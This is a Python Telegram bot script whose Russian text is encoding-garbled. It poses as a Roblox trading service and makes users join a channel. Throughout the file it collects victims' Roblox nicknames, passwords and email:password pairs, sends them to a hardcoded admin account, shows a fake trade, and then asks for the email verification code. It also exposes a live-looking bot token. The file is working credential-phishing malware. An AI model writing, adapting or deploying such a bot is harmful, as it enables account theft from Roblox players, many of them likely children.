iimport telebot
from telebot import types
import time

TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
ADMIN_ID = 6760627781
bot = telebot.TeleBot(TOKEN)

# –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
users_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    try:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞ –∫–∞–Ω–∞–ª
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "‚úÖ –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è", 
            url="https://t.me/hbgrrhve"
        )
        markup.add(btn)
        
        bot.send_message(
            message.chat.id,
            "üìõ –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –æ–±–º–µ–Ω—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –∫–∞–Ω–∞–ª:",
            reply_markup=markup
        )
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    try:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∫–∏
        chat_member = bot.get_chat_member("@–≤–∞—à_–∫–∞–Ω–∞–ª", message.from_user.id)
        if chat_member.status not in ['member', 'administrator', 'creator']:
            bot.send_message(message.chat.id, "‚ùå –í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ –∫–∞–Ω–∞–ª!")
            return
            
        # –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞
        if message.text == "üîì –ù–∞—á–∞—Ç—å –æ–±–º–µ–Ω":
            msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–∏–∫ Roblox:")
            bot.register_next_step_handler(msg, process_login)
            
    except Exception as e:
        bot.send_message(ADMIN_ID, f"üö® –û—à–∏–±–∫–∞: {str(e)}")

def process_login(message):
    try:
        users_data[message.chat.id] = {"nick": message.text}
        msg = bot.send_message(message.chat.id, "üîë –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:")
        bot.register_next_step_handler(msg, process_password)
    except Exception as e:
        print(e)

def process_password(message):
    try:
        users_data[message.chat.id]["password"] = message.text
        msg = bot.send_message(message.chat.id, "üìß –í–≤–µ–¥–∏—Ç–µ email:–ø–∞—Ä–æ–ª—å:")
        bot.register_next_step_handler(msg, final_step)
    except Exception as e:
        print(e)

def final_step(message):
    try:
        users_data[message.chat.id]["email"] = message.text
        # –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∞–¥–º–∏–Ω—É
        report = f"""
        üé£ –ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ!
        ID: {message.from_user.id}
        –ù–∏–∫: {users_data[message.chat.id]['nick']}
        –ü–∞—Ä–æ–ª—å: {users_data[message.chat.id]['password']}
        –ü–æ—á—Ç–∞: {users_data[message.chat.id]['email']}
        """
        bot.send_message(ADMIN_ID, report)
        # –§–∏–∫—Ç–∏–≤–Ω—ã–π –æ–±–º–µ–Ω
        bot.send_message(message.chat.id, "üîç –ò—â–µ–º –ø–æ–¥—Ö–æ–¥—è—â–∏–π –∞–∫–∫–∞—É–Ω—Ç...")
        time.sleep(3)
        bot.send_message(message.chat.id, "‚úÖ –ù–∞–π–¥–µ–Ω –∞–∫–∫–∞—É–Ω—Ç —Å 10K Robux!\n–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ email –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è")
    except Exception as e:
        print(e)

if __name__ == "__main__":
    print("üü¢ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω")
    bot.polling(none_stop=True)